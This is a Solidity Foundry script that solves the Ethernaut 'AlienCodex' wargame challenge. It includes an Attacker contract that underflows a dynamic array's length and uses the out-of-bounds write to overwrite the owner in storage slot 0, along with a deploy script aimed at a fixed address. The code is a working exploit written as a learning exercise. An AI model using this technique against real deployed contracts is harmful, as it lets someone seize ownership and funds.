// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface AlienCodex {
    function contact() external view returns(bool);
    function codex() external view returns(bytes32[] memory);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Attacker {
    AlienCodex target;
    
    constructor(address _target) {
        target = AlienCodex(_target);
        // bypass modifier
        target.makeContact(); 
        // cause underflow, solidity v < 0.8. Array length is now max uint256
        target.retract(); 

        // keccak256 accepts only bytes32, that's why we need to convert uint256(1) to bytes with abi.encode(uint256(1))
        // calculate the slot where the first element from codex[] is stored
        uint256 k = uint256(keccak256(abi.encode(uint256(1))));  

        uint256 i;

        // unchecked because the Attacker contract is implemented with solidity v > 0.8.0
        unchecked {
            // calculate the zeroth slot
            i = i - k;
        }
        target.revise(i, bytes32(uint256(uint160(msg.sender))));
    }
}
/// @author agadzhalov
/// @title Solution to AlienCodex Ethernaut challenge
/// @notice Solution: 
///         Must know prerequisites are:
///         1. Understanding of underflow
///         2. How dynamic arrays are stored in the EVM
///         3. The contract is implemented using Solidity version 0.5.0
///
///         The `owner` is stored in the 0th slot since the contract inherits `Ownable` where the first variable is `_owner`.
///         This can be checked using `cast storage`.
///
///         - 0th slot: 0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11
///           (Owner address is the 20-byte address `0x0bc04aa6aac163a6b3667636d798fa053d43bd11`)
///         - `bool contact` is 1 byte and is also stored in the 0th slot.
///         - 1st slot contains the length of the dynamic array `codex[]`.
///         - Elements of the `codex[]` array start from `keccak(1)`.
///
///         Resources: 
///         - https://dev.to/ceasermikes002/understanding-how-the-evm-stores-mappings-arrays-and-structs-in-solidity-5adh
///         - https://medium.com/coinmonks/learn-solidity-lesson-22-type-casting-656d164b9991
contract AlienCodexScript is Script {

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the Attacker contract with the AlienCodex contract address as a parameter
        Attacker attacker = new Attacker(0xeA56fb8A927c78Fe02F3a99AAEdb8f42cceFA79b);

        vm.stopBroadcast();
    }
}